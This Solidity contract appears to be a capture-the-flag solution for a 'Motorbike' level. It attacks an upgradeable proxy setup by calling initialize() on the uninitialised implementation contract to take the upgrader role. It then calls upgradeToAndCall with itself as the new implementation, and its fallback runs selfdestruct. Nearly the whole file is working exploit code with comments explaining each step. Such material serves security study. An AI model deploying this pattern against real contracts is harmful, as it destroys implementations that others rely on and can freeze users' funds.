pragma solidity 0.8.6;

contract EngineAttack {

    constructor() {
    
    }
    function attack(address engine, address bike) external {

        //function sel for upgradeToAndCall()
        bytes4 sel = bytes4(keccak256(
            "upgradeToAndCall(address,bytes)"));
        bytes memory data = "0x49681ba0";
        
        bytes memory initdata = bytes(abi.encodeWithSelector(bytes4(keccak256("initialize()"))));
        //calling the engines initialize() function. possible because the motorbike contract used delegatecall in its constructor to call initialize().
        engine.call(initdata);
        //bypass motorbike, and directly call upgradeToAndCall(). will pass upgrader check b/c of previous call. 
        engine.call(abi.encodeWithSelector(sel, address(this), data));

    }
     fallback() external {
        //motorbike will delegatecall this contract in upgradeToAndCall(). so we set the fallback to self destruct and BOOM!
        selfdestruct(payable(0));
    }
}
